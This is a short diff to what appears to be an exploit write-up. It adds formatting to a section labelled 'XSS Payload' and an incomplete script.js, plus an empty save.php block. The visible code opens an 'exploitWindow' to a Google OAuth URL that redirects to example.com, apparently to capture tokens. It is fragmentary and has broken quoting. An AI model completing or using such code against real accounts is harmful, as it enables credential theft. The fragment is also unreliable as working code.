@@ -20,7 +20,7 @@ XSS Payload:
 ```
 
 script.js INCOMPLETE CODE:
-```
+```Javascript
 let exploitWindow = window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com/auth/google/callback&response_type=",
     "example",
     "width=600,height=400, status=yes,scrollbars=yes, resizable=yes",
@@ -53,4 +53,9 @@ if (exploitWindow.closed) {
         );
     }
 }, 1000);
+```
+
+save.php:
+```PHP
+
 ```
